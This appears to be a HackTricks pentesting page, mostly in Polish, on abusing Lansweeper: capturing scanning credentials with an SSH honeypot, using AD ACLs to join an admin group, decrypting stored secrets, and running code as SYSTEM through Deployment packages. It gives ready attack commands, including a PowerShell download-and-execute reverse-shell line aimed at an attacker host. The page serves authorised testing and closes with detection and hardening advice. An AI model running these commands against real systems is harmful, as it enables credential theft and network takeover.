# Lansweeper Abuse: przechwytywanie danych uwierzytelniających, odszyfrowywanie sekretów i Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper to platforma do wykrywania i inwentaryzacji zasobów IT, często wdrażana w systemie Windows i zintegrowana z Active Directory. Dane uwierzytelniające skonfigurowane w Lansweeper są używane przez jego silniki skanujące do uwierzytelniania się względem zasobów za pomocą protokołów takich jak SSH, SMB/WMI i WinRM. Błędne konfiguracje często umożliwiają:

- Przechwycenie danych uwierzytelniających poprzez przekierowanie celu skanowania na host kontrolowany przez atakującego (honeypot)
- Wykorzystanie list kontroli dostępu AD ujawnionych przez grupy powiązane z Lansweeper w celu uzyskania zdalnego dostępu
- Odszyfrowanie na hoście sekretów skonfigurowanych w Lansweeper (connection strings i zapisane dane uwierzytelniające używane do skanowania)
- Wykonanie kodu na zarządzanych endpointach za pośrednictwem funkcji Deployment (często działającej jako SYSTEM)

Ta strona podsumowuje praktyczne działania atakującego i polecenia służące do wykorzystywania tych zachowań podczas engagements.

## 1) Przechwytywanie danych uwierzytelniających używanych do skanowania za pomocą honeypot (przykład SSH)

Pomysł: utwórz Scanning Target wskazujący na Twój host i przypisz do niego istniejące Scanning Credentials. Gdy skanowanie zostanie uruchomione, Lansweeper spróbuje uwierzytelnić się za pomocą tych danych, a Twój honeypot je przechwyci.<sup>[[1]](#references)</sup>

Przegląd kroków (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (lub Single IP) = Twój VPN IP
- Skonfiguruj port SSH na osiągalny (np. 2022, jeśli port 22 jest zablokowany)
- Wyłącz harmonogram i zaplanuj ręczne uruchomienie
- Scanning → Scanning Credentials → upewnij się, że istnieją dane uwierzytelniające Linux/SSH; przypisz je do nowego celu (w razie potrzeby włącz wszystkie)
- Kliknij “Scan now” dla celu
- Uruchom honeypot SSH i pobierz próbę użycia nazwy użytkownika/hasła

Przykład z sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Zweryfikuj przechwycone dane uwierzytelniające względem usług DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Other protocols are not equivalent: an SMB/WinRM listener normally obtains an NTLM challenge-response rather than a cleartext password. Cracking or relaying it depends on the negotiated protocol protections; see [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). SSH password authentication is usually the simplest cleartext case.
- SSH public-key authentication exposes the username and public-key fingerprint to the server, **not** the private key or its passphrase. Recover key-backed credentials from the compromised Lansweeper server instead of expecting a honeypot to disclose them.<sup>[[2]](#references)</sup>
- Many scanners identify themselves with distinct client banners (e.g., RebexSSH) and will attempt benign commands (uname, whoami, etc.).

### Kolejność wyboru poświadczeń ma znaczenie

For a rescan, Lansweeper first retries the credential that last succeeded for that asset, then the explicitly mapped credentials in their configured order, and finally the global credential of the same type. A honeypot that accepts the first password authentication therefore normally will not observe later fallback credentials; during an authorized credential-path assessment, log and reject attempts if the objective is to verify the complete fallback sequence.<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: uzyskaj zdalny dostęp, dodając siebie do grupy app-admin

Use BloodHound to enumerate effective rights from the compromised account. A common finding is a scanner- or app-specific group (e.g., “Lansweeper Discovery”) holding GenericAll over a privileged group (e.g., “Lansweeper Admins”). If the privileged group is also member of “Remote Management Users”, WinRM becomes available once we add ourselves.<sup>[[1]](#references)[[5]](#references)</sup>

Przykłady kolekcji:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll na grupie za pomocą BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Następnie uzyskaj interaktywny shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Wskazówka: operacje Kerberos są zależne od czasu. Jeśli napotkasz KRB_AP_ERR_SKEW, najpierw zsynchronizuj czas z DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Odszyfrowywanie sekretów skonfigurowanych w Lansweeper

Na serwerze Lansweeper witryna ASP.NET zazwyczaj przechowuje zaszyfrowany connection string oraz klucz symetryczny używany przez aplikację. Przy odpowiednim dostępie lokalnym można odszyfrować connection string do bazy danych, a następnie wyodrębnić zapisane dane uwierzytelniające używane podczas skanowania.<sup>[[1]](#references)</sup>

Typowe lokalizacje:
- Konfiguracja witryny: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Klucz aplikacji: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Użyj SharpLansweeperDecrypt, aby zautomatyzować odszyfrowywanie i zrzucanie zapisanych danych uwierzytelniających. Bez argumentów bieżący plik wykonywalny odszyfrowuje `web.config`, łączy się z bazą danych i zrzuca wszystkie skonfigurowane dane uwierzytelniające używane podczas skanowania; `-e` obsługuje również offline/manual decryption, gdy zaszyfrowana wartość i plik klucza są już dostępne:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
Oczekiwany wynik obejmuje szczegóły połączenia z bazą danych oraz dane uwierzytelniające w plaintext, takie jak konta Windows i Linux używane w całym środowisku. Często mają one podwyższone uprawnienia lokalne na hostach domeny:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Użyj odzyskanych danych uwierzytelniających do skanowania systemu Windows w celu uzyskania uprzywilejowanego dostępu:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Jako członek grupy „Lansweeper Admins” interfejs webowy udostępnia sekcje Deployment i Configuration. W sekcji Deployment → Deployment packages można tworzyć pakiety wykonujące dowolne polecenia na wskazanych assetach. Lansweeper używa administracyjnych danych uwierzytelniających do skanowania, aby uzyskać dostęp do Task Scheduler oraz `C$` na celu, a następnie tworzy zadanie na potrzeby deploymentu. Gdy pakiet korzysta z trybu uruchamiania **System Account**, payload jest wykonywany jako `NT AUTHORITY\SYSTEM`; inne tryby uruchamiania mogą używać zmapowanych danych uwierzytelniających skanowania albo aktualnie zalogowanego użytkownika, dlatego należy sprawdzić wybrany tryb, zamiast zakładać użycie SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

Najważniejsze kroki:
- Utwórz nowy pakiet Deployment, który uruchamia one-liner PowerShell lub cmd (reverse shell, add-user itp.).
- Wskaż żądany asset (np. DC/host, na którym działa Lansweeper) i kliknij Deploy/Run now.
- Odbierz shell jako SYSTEM.

Przykładowe payloady (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Działania wdrożeniowe są głośne i pozostawiają logi w Lansweeper oraz dziennikach zdarzeń systemu Windows. Używaj ich rozważnie.

### Artefakty wdrożenia i drugi punkt ujawnienia poświadczeń

Scanner zapisuje plik wykonywalny wdrożenia w `C:\Windows\LSDeployment` przez `C$`. Pliki pakietów są zwykle odczytywane z `DefaultPackageShare$`, którego zapleczem jest `C:\Program Files (x86)\Lansweeper\PackageShare`, lub z udziału pakietów właściwego dla danego zakresu adresów IP. Co ważne, dokumentacja Lansweeper informuje, że poświadczenie udziału pakietów jest przechowywane w **odwracalnie zaszyfrowanej formie w rejestrze każdego komputera otrzymującego wdrożenie**. Traktuj przejęty zarządzany endpoint jako potencjalny punkt ujawnienia konta tego udziału i podczas odtwarzania aktywności Lansweeper sprawdzaj katalog wdrożenia, historię zadań zaplanowanych oraz skonfigurowane udziały pakietów.<sup>[[7]](#references)</sup>

## Wykrywanie i hardening

- Ogranicz lub usuń anonimowe enumeracje SMB. Monitoruj RID cycling oraz nietypowy dostęp do udziałów Lansweeper.
- Kontrola ruchu wychodzącego: blokuj lub ściśle ograniczaj wychodzące połączenia SSH/SMB/WinRM z hostów scannerów. Generuj alerty dla niestandardowych portów (np. 2022) oraz nietypowych bannerów klienta, takich jak Rebex.
- Chroń `Website\\web.config` i `Key\\Encryption.txt`. Przechowuj sekrety zewnętrznie w vault i rotuj je po ujawnieniu. Rozważ konta usług z minimalnymi uprawnieniami oraz gMSA, gdy jest to możliwe.
- Monitorowanie AD: generuj alerty dotyczące zmian w grupach powiązanych z Lansweeper (np. „Lansweeper Admins”, „Remote Management Users”) oraz zmian ACL przyznających uprawnienia GenericAll/Write do członkostwa w uprzywilejowanych grupach.
- Audytuj tworzenie, zmiany i wykonywanie pakietów Deployment oraz koreluj nowe zdalne zadania zaplanowane z zapisami do `C:\Windows\LSDeployment`; generuj alerty dla pakietów uruchamiających `cmd.exe`/`powershell.exe` lub nawiązujących nieoczekiwane połączenia wychodzące.
- Przyznawaj poświadczeniom udziału pakietów wyłącznie uprawnienie **Read & Execute** i nigdy nie używaj ich ponownie do administracji. Tam, gdzie to praktyczne, preferuj inwentaryzację opartą na agentach: jeśli wszystkie komputery są skanowane przez agenta, a moduł deploymentu nie jest używany, Lansweeper nie wymaga przechowywania poświadczeń skanowania komputerów.<sup>[[6]](#references)[[7]](#references)</sup>

## Powiązane tematy
- [Enumeracja SMB/LSA/SAMR i RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Uwierzytelnianie Kerberos i kwestie związane z rozbieżnością czasu](kerberos-authentication.md)
- [Analiza ścieżek BloodHound](bloodhound.md)
- [Użycie WinRM i lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — nadużywanie skanowania Lansweeper, ACL AD i sekretów w celu przejęcia DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (honeypot SSH)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Tworzenie i mapowanie poświadczeń skanowania — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Wymagania dotyczące deploymentu — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
